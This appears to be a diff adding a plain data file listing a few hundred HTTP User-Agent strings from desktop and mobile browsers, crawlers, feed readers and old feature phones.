@@ -1,0 +1,2000 @@
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2839.45 Safari/537.36
+Cirkwi-search/1.0
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.62 YaBrowser/19.9.0.918 (beta) Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3131.105 Safari/537.36
+XenForo/1.5 (https://www.forosperu.net)
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2534.57 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 YaBrowser/19.7.0.1990 Yowser/2.5 Safari/537.36
+okhttp/2.5.0
+Mozilla/5.0 (Linux; Android 9; moto e6s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; Lenovo A7000-a Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; KYOCERA-C6742) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2290.72 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2631.3 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2738.10 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2576.137 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2821.166 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1;WOW64) AppleWebKit/537.36 (KHTML,like GeCKO) Chrome/45.0.2454.85 Safari/537.36 115Broswer/6.0.3
+Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:84.0) Gecko/20100101 Firefox/84.0
+Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.0 Safari/537.36
+Maui Browser
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.2639.98 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2358.2 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2166.21 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3186.89 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2915.57 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2476.120 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3072.163 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3239.120 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.2.1.174 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 PaleMoon/27.9.3
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Safari/537.36 OPR/30.0.1856.93524
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.56 Safari/537.4
+Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2806.89 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2233.34 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3109.74 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2224.51 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2244.107 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2424.152 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2238.122 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4402.0 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2289.113 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0; SM-A710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3188.43 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-A515F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 YaApp_Android/8.70 YaSearchBrowser/8.70
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3377.141 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2507.94 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2352.143 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0; ASUS_X00GD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4387.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2914.16 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2224.10 Safari/537.36
+Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0)
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3169.98 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3068.116 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Uzbl (Webkit 1.3) (Linux i686 [i686])
+Mozilla/5.0 (Linux; Android 9; RMX1821) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36,gzip(gfe)
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3350.35 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
+Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3324.99 Safari/537.36
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2638.1 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2815.32 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [Pinterest/Android]
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.3472.4 Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729; Diffbot/0.1;  http://www.diffbot.com)
+Dart/2.12 (dart:io)
+Mozilla/4.0 (compatible; MSIE 4.01; Windows NT Windows CE)
+Klondike/1.50 (WSP Win32) (Google WAP Proxy/1.0)
+JetBrains Omea Reader 2.0 Release Candidate 1 (http://www.jetbrains.com/omea_reader/)
+Mozilla/5.0 (Linux; Android 10; PCCM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 QIHU 360SE
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.72
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2536.33 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1612.2 Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3404.149 Safari/537.36
+Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3355.103 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2684.86 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 Version/12.2.1.0.4
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) MxBrowser/4.5.10.7000 Chrome/30.0.1551.0 Safari/537.36
+Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2085.15 Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4403.1 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3075.163 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4405.0 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0,gzip(gfe)
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+Rome Client (http://tinyurl.com/64t5n) Ver: 0.9
+Mozilla/5.0 (Linux; Android 10; SM-A505G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2421.60 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; (gmx/1.4.0.0); rv:11.0) like Gecko
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3178.31 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3059.152 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3020.4 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0,gzip(gfe)
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2969.98 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2496.84 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3097.100 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4394.2 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3161.132 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SM-J737A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
+SonyEricssonT100/R101
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0)
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C)
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3168.47 Safari/537.36
+SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)
+Mozilla/5.0 (Linux; Android 9; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36
+SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3
+MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0
+SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0
+Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.3(0x17000321) NetType/WIFI Language/zh_CN
+Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2600.65 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36,gzip(gfe)
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/66.0.3359.139 Chrome/66.0.3359.139 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2691.108 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2763.80 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3022.17 Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5
+Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2936.96 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A705F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.828 Yowser/2.5 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36 OPR/19.0.1326.56
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3186.44 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2740.77 Safari/537.36
+MAUI WAP Browser
+Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2177.59 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3166.151 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4408.0 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4395.0 Safari/537.36
+Mozilla/5.0 (Linux; U; Android 7.1.1; de-de; MI MAX 2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.7.5-go
+Opera/6.x (Windows NT 4.0; U) [de]
+Mozilla/5.0 (Linux; Android 5.1; H9 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.147 Mobile Safari/537.36 (compatible; Google-AMPHTML)
+Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Safari/605.1.15 Epiphany/605.1.15
+Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3345.134 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3308.29 Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; SM-G900H Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2724.31 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2565.91 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2241.35 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) SFive/64.0 Chrome/64.0.3282.204 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2406.14 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2750.109 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; LDN-L21 Build/HUAWEILDN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2907.14 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2270.67 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2681.45 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3535.68 Safari/537.36
+Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36
+Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3109.153 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.344
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.344 (Edition avira-2)
+W3C_Validator/1.654
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2873.143 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2187.147 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2552.115 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T555) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2549.72 Safari/537.36
